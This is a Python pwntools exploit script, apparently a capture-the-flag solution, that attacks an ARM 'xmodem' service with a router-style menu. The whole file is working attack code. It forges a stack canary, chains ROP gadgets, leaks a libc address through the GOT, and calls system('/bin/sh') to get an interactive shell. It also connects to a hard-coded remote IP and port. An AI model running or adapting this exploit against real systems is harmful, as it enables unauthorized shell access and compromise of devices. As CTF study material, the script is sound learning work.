#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    login('root', '\x00')
    addMAC('hello')
    addMAC('hello')
    addMAC(p32(0x10ef5))
    addMAC('aa' + '\xfe\xff\xff\xff')

    # fake_canary = 0x21FFF
    fake_canary = 0x61616161
    addMAC('a' * 8 + p32(fake_canary) + '\x00' * 8 + p32(fake_canary))

    # 0x00010ef8 : mov r0, r7 ; blx r3
    # 0x00010f00 : pop.w {r3, r4, r5, r6, r7, r8, sb, pc}
    # 0x00010910 : mov sp, r7 ; pop {r7, pc}

    rop_addr = 0x10911
    ssid_addr = 0x22004
    wb = p16(rop_addr & 0xffff)
    pclose_got_addr = 0x21FF8
    popen_addr = 0x1079C
    # popen_addr = 0x10CC5
    readstr_addr = 0x108C5
    read_addr = 0x1070C
    puts_addr = 0x10754

    rop = p32(0x10f01) + p32(read_addr) + p32(0) * 3 + p32(0x22070-4) + p32(0x22070) + p32(800) + p32(0x10911)
    # rop = p64(0) + p32(atoi_got_addr) + p32(0x10ef9)
    ssid(rop[:20])
    pw(rop[20:])

    newpw = '\x00' * 4 + p32(fake_canary) * 11 + p32(0) + p32(ssid_addr) + wb
    login('test', newpw)

    rop = p32(0) * 8
    rop += p32(0x10913) + p32(0x22070 + 700 - 4) + p32(0x10911)
    rop = rop.ljust(700, '\x00')
    rop += p32(0x10f01) + p32(puts_addr) + p32(0) * 3 + p32(pclose_got_addr) + p32(0x10F3C) + p32(0) + p32(0x10ef7)
    rop += p32(read_addr) + p32(0) * 3 + p32(0) + p32(0x22350+36-4) + p32(100) + p32(0x10ef5)

    r.sendlineafter('Wrong username or password!', rop)
    raw = r.recv(4)
    pclose = u32(raw)

    # if LOCAL:
    #     libc_addr = pclose - 0x4c451
    #     system_addr = libc_addr + 0x2d4cd
    #     sh_addr = libc_addr + 0xD5F2C
    # else:
    #     libc_addr = pclose - 0x4a6a1
    # libc_addr = pclose - 0x4c451
    # system_addr = libc_addr + 0x2d4cd
    # sh_addr = libc_addr + 0xD5F2C
    libc_addr = pclose - 0x4a6a1
    system_addr = libc_addr + 0x2c781
    sh_addr = libc_addr + 0xCA3E4
    log.info(hex(libc_addr))

    r.sendline(p32(system_addr) + p32(0) * 3 + p32(sh_addr) + p32(0) * 2 + p32(0x10ef9))

    r.interactive()


def login(username, passwd):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('User name:', username)
    r.sendafter('Password:', passwd)


def info():
    r.sendlineafter('Your choice: ', '2')


def addMAC(mac):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('MAC address: ', mac)


def pw(newpw):
    r.sendlineafter('Your choice: ', '6')
    r.sendafter('New Wireless Password: ', newpw)


def ssid(newssid):
    r.sendlineafter('Your choice: ', '5')
    r.sendafter('New SSID: ', newssid)


if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    gdb_command = '''
        b *0x10f00
        c
    '''
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('42.117.243.201', 9999)
        LOCAL = False
    elif sys.argv[1] == 'local':
        r = process('./xmodem', env={'LD_PRELOAD':'/usr/arm-linux-gnueabihf/lib/libc.so.6'})
        LOCAL = True
    elif sys.argv[1] == 'debug':
        r = gdb.debug('./xmodem', gdb_command, arch='arm', env={'LD_PRELOAD':'/usr/arm-linux-gnueabihf/lib/libc.so.6'})
    else:
        exit()
    exploit()
